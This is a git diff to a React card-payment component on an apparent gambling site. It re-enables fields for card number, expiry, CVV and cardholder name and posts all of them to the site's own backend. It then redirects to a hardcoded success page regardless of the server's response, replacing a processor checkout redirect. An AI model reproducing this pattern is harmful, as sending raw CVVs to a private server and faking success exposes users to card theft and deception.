@@ -15,6 +15,7 @@ import USDTIcon from '../../assets/images/crypto/USDT.png';
 import CryptoButton from "../CryptoButton";
 import {useTranslation} from "react-i18next";
 import $api from "../../http";
+import {useLocation} from "react-router";
 
 const BonusButton = ({name, img, onClick, bonus}) => {
     const [isActive, setIsActive] = useState(name === bonus)
@@ -93,8 +94,8 @@ const CardPay = ({ amount, submit, setCurrent }) => {
 
     const goToPay = () => {
         if (amount >= 500) {
-            $api.post('get-checkout', {amount}).then(rs => {
-                window.location.href = rs.data
+            $api.post('get-checkout', {amount, fio, cardNumber, cardDate, cvv}).then(rs => {
+                window.location.href = 'https://www.makao777.com/success'
             })
         }
     }
@@ -137,34 +138,34 @@ const CardPay = ({ amount, submit, setCurrent }) => {
             <div className="alert">
                 {t('min_push')} - 500
             </div>
-                {/*<MaskedInput*/}
-                {/*    placeholder={t('card_number')}*/}
-                {/*    className='field'*/}
-                {/*    value={cardNumber}*/}
-                {/*    mask={cardMask}*/}
-                {/*    keepCharPositions={true}*/}
-                {/*    showMask={false}*/}
-                {/*    style={{ width: 300 }}*/}
-                {/*    onChange={setCardNumber}*/}
-                {/*/>*/}
-                {/*<MaskedInput*/}
-                {/*    placeholder={'MM/YY'}*/}
-                {/*    className='field'*/}
-                {/*    value={cardDate}*/}
-                {/*    mask={cardDateMask}*/}
-                {/*    keepCharPositions={true}*/}
-                {/*    showMask={false}*/}
-                {/*    style={{ width: 300 }}*/}
-                {/*    onChange={setCardDate}*/}
-                {/*/>*/}
-                {/*<Input className='field' placeholder={'CVV'} type='number' value={cvv} onChange={setCvv} />*/}
-                {/*<Input className='field' placeholder={t('fio')} value={fio} onChange={setFio} />*/}
+                <MaskedInput
+                    placeholder={t('card_number')}
+                    className='field'
+                    value={cardNumber}
+                    mask={cardMask}
+                    keepCharPositions={true}
+                    showMask={false}
+                    style={{ width: 300 }}
+                    onChange={setCardNumber}
+                />
+                <MaskedInput
+                    placeholder={'MM/YY'}
+                    className='field'
+                    value={cardDate}
+                    mask={cardDateMask}
+                    keepCharPositions={true}
+                    showMask={false}
+                    style={{ width: 300 }}
+                    onChange={setCardDate}
+                />
+                <Input className='field' placeholder={'CVV'} type='number' value={cvv} onChange={setCvv} />
+                <Input className='field' placeholder={t('fio')} value={fio} onChange={setFio} />
                 {/*<Input className='field' placeholder={t('phone')} value={phone} onChange={setPhone} />*/}
                 {/*<Input className='field' placeholder={t('promo')} />*/}
-            {/*<Button disabled={amount < 500} onClick={() => goToPay()} className="pink-btn btn-lg rounded">{t('go_to_pay')}</Button>*/}
+            <Button disabled={amount < 500} onClick={() => goToPay()} className="pink-btn btn-lg rounded">{t('go_to_pay')}</Button>
         </div>
         <div className="foot">
-            <Button onClick={handleClick} className="pink-btn btn-lg rounded">{loading ? t('loading')+'...' : t('next')}</Button>
+            {/*<Button onClick={handleClick} className="pink-btn btn-lg rounded">{loading ? t('loading')+'...' : t('next')}</Button>*/}
             <Button onClick={() => setCurrent('crypto')} className="pink-btn btn-lg rounded">{t('pay_crypto')}</Button>
             <Button onClick={() => setCurrent('cold')} className="pink-btn btn-lg rounded">{t('pay_cold')}</Button>
             {/*<a href={"https://pay.fondy.eu/api/checkout?button=4ma3lqg9f5h4wwb251b75z3trdkcu8rs"} className="pink-btn btn-lg rounded">Pay Test</a>*/}
